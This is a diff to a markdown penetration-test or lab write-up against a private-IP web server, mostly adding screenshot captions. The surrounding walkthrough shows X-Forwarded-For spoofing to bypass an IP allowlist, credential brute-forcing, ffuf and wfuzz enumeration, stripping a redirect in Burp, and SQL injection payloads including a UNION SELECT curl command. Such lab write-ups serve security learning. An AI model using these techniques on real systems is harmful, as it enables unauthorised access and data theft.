@@ -1,6 +1,6 @@
 # target IP 192.168.86.200
 
-![](https://github.com/user-attachments/assets/5a52c98f-0526-4c6b-a8e2-22820aaca06c)
+![login.php blocked - only 10.10.10.x allowed](https://github.com/user-attachments/assets/5a52c98f-0526-4c6b-a8e2-22820aaca06c)
 
 ```py
 import requests
@@ -22,7 +22,7 @@ for i in range(256):
 
 ```
 
-![](https://github.com/user-attachments/assets/65642d09-9464-44c9-9607-9a82cfb5e825)
+![requests_.py X-Forwarded-For loop - all IPs return status 200](https://github.com/user-attachments/assets/65642d09-9464-44c9-9607-9a82cfb5e825)
 
 ???(kali?kali)-[~]
 ??$ sudo python3 requests_3.py  
@@ -48,7 +48,7 @@ for i in range(256):
 
 ```
 
-![](https://github.com/user-attachments/assets/42b33d1b-216f-4276-830a-7f39b64da66c)
+![requests_3.py found working IP 10.10.10.0](https://github.com/user-attachments/assets/42b33d1b-216f-4276-830a-7f39b64da66c)
 
 ```html
 <!DOCTYPE html>
@@ -84,14 +84,14 @@ for i in range(256):
 
 # burpsuite proxy header setting
 
-![](https://github.com/user-attachments/assets/4b5a181d-00e8-4e41-aff4-fba23c156394)
+![Burp match/replace rule - request header X-Forwarded-For 10.10.10.0](https://github.com/user-attachments/assets/4b5a181d-00e8-4e41-aff4-fba23c156394)
 
-![](https://github.com/user-attachments/assets/d46530b3-94d5-4e12-bb5b-544b5bbbbd0a)
+![login.php via Burp proxy with intercept on](https://github.com/user-attachments/assets/d46530b3-94d5-4e12-bb5b-544b5bbbbd0a)
 
 # Bruteforce with X-Forwarded-For
 
-![](https://github.com/user-attachments/assets/b204e331-2ed9-4d53-97ff-a62df3991c52)
-![](https://github.com/user-attachments/assets/61dbf70e-0933-4e0a-acd2-71a43e2a8e2b)
+![login attempt with ' OR 1=1-- in username](https://github.com/user-attachments/assets/b204e331-2ed9-4d53-97ff-a62df3991c52)
+![Burp proxy error - no response received from remote server](https://github.com/user-attachments/assets/61dbf70e-0933-4e0a-acd2-71a43e2a8e2b)
 
 ```py
 # python3 bruteforce_x_forwarded_for.py --url http://192.168.86.200/login.php --xff 10.10.10.0 --usernames "usernames.txt" --passwords "passwords.txt"
@@ -194,13 +194,13 @@ if __name__ == "__main__":
 ![It shows all 200 status code](https://github.com/user-attachments/assets/c825f7f2-d66e-4cfd-87ea-e79ce9d6afe6)
 
 - It Shows 1770 lenth
-  ![](https://github.com/user-attachments/assets/5959b6eb-079e-4556-ad73-c1c4777bf7fb)
+  ![bruteforce output - len content 1770 with code 200](https://github.com/user-attachments/assets/5959b6eb-079e-4556-ad73-c1c4777bf7fb)
 - bruteforce -> not found
-  ![](https://github.com/user-attachments/assets/ea32b22b-817e-41fe-ab4e-876f515a1f68)
+  ![bruteforce finished 170000/170000 - credentials not found](https://github.com/user-attachments/assets/ea32b22b-817e-41fe-ab4e-876f515a1f68)
 
 > sudo nmap 192.168.86.200 -Pn --open -sC -sV -O -oN scan.txt
 
-![](https://github.com/user-attachments/assets/0a3fab28-54dc-43c2-b2bf-fd8b8d77bfb6)
+![nmap scan - 22 OpenSSH, 80 PHP cli server, Windows host](https://github.com/user-attachments/assets/0a3fab28-54dc-43c2-b2bf-fd8b8d77bfb6)
 
 - -fc -> exclude
 
@@ -208,19 +208,19 @@ if __name__ == "__main__":
 
 > ffuf -u http://192.168.86.200 -H "Host:FUZZ.192.168.86.200" -H "X-Forwarded-For: 10.10.10.0" -w /usr/share/seclists/Discovery/DNS/namelist.txt -fc 404 -t 50 > result_ffuf.txt
 
-![](https://github.com/user-attachments/assets/308d2792-239c-42d7-a9d4-6f9e9fcd38b2)
+![ffuf subdomain fuzzing - no subdomain hits, saved to result_ffuf.txt](https://github.com/user-attachments/assets/308d2792-239c-42d7-a9d4-6f9e9fcd38b2)
 
 # found -> ip, IP, login, Login, LOGIN, home, Home, index, Index.php
 
 > ffuf -u http://192.168.86.200/FUZZ.php -H "X-Forwarded-For: 10.10.10.0" -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -fc 404 -t 50
 
-![](https://github.com/user-attachments/assets/a1f68392-76c7-4a9e-a7d2-34aaa8b2d1a9)
+![ffuf FUZZ.php raft-medium-directories - found login, home, index, ip](https://github.com/user-attachments/assets/a1f68392-76c7-4a9e-a7d2-34aaa8b2d1a9)
 
 # found -> login, nul.php
 
 > ffuf -u http://192.168.86.200/FUZZ.php -H "X-Forwarded-For: 10.10.10.0" -w /usr/share/wordlists/wfuzz/general/big.txt -fc 404,302 -t 50
 
-![](https://github.com/user-attachments/assets/b31c29fa-9d2e-4f84-a52f-3927fd19d6f2)
+![ffuf FUZZ.php big.txt -fc 404,302 - found login, nul](https://github.com/user-attachments/assets/b31c29fa-9d2e-4f84-a52f-3927fd19d6f2)
 
 # found -> home, index.php
 
@@ -228,23 +228,23 @@ if __name__ == "__main__":
 
 > wfuzz -H "X-Forwarded-For: 10.10.10.0" --sc 302 -u http://192.168.86.200/FUZZ.php -w /usr/share/wordlists/wfuzz/general/big.txt
 
-![](https://github.com/user-attachments/assets/4c297cf5-6263-4d78-86b6-b42ce97faf95)
+![wfuzz --sc 302 - found home, index](https://github.com/user-attachments/assets/4c297cf5-6263-4d78-86b6-b42ce97faf95)
 
 # 192.168.86.200/home.php
 
 # turn on intercept server to client requests
 
-![](https://github.com/user-attachments/assets/52870492-12ad-4c6a-b425-6431ea834183)
+![Burp response interception rules enabled](https://github.com/user-attachments/assets/52870492-12ad-4c6a-b425-6431ea834183)
 
-![](https://github.com/user-attachments/assets/a20c7c6a-2c8a-4a80-a4b3-09f3ab6d3b33)
+![Burp WebSocket interception rules - client-to-server and server-to-client on](https://github.com/user-attachments/assets/a20c7c6a-2c8a-4a80-a4b3-09f3ab6d3b33)
 
 # remove location in response header
 
-![](https://github.com/user-attachments/assets/3d5cea36-2007-4457-84d8-0b2f491b5a99)
+![intercepted 302 response with Location login.php header](https://github.com/user-attachments/assets/3d5cea36-2007-4457-84d8-0b2f491b5a99)
 
 # arrived at 192.168.86.200/home.php
 
-![](https://github.com/user-attachments/assets/6d0a563d-3a0c-44e1-a7bc-b9fd16473f61)
+![home.php after dropping redirect - Manage Employees list](https://github.com/user-attachments/assets/6d0a563d-3a0c-44e1-a7bc-b9fd16473f61)
 
 - 1 Desireef Joubert 2007-04-01
   2 Blythe Weatherall 2007-05-10
@@ -254,10 +254,10 @@ if __name__ == "__main__":
 
 # set response Location: login.php -> "" in burpsuite
 
-![](https://github.com/user-attachments/assets/39be4057-a9f0-4f9b-9314-6bcd1a99e36c)
+![Burp match/replace rule - remove response header Location login.php](https://github.com/user-attachments/assets/39be4057-a9f0-4f9b-9314-6bcd1a99e36c)
 
-![](https://github.com/user-attachments/assets/5cba9e70-6ee3-4a82-ae48-6474dede1b34)
-![](https://github.com/user-attachments/assets/b61dc57f-df95-4070-8d04-226a6f6a588a)
+![editing employee 1 Desireef Joubert via action=update](https://github.com/user-attachments/assets/5cba9e70-6ee3-4a82-ae48-6474dede1b34)
+![employees page 2 - ids 6 to 10](https://github.com/user-attachments/assets/b61dc57f-df95-4070-8d04-226a6f6a588a)
 
 - Id First name Last name Birth date Actions
   6 Amado Grimaldi 2007-06-18
@@ -281,6 +281,6 @@ if __name__ == "__main__":
 
 > ' UNION select * from employees'
 > http://192.168.86.200/home.php?action=search&first_name=%27+UNION+select+*+from+employees%27&last_name=lastname
-> ![](https://github.com/user-attachments/assets/7b7a5604-d4dd-4607-b1c0-624c00dc59c8)
+> ![UNION select PoC - Number of Employees 0](https://github.com/user-attachments/assets/7b7a5604-d4dd-4607-b1c0-624c00dc59c8)
 
 curl -X GET "http://192.168.86.200/home.php?action=search&first_name=%27+UNION+select+%2A+from+employees%27&last_name=lastname" -H "X-Forwarded-For: 10.10.10.0" -H "User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0"
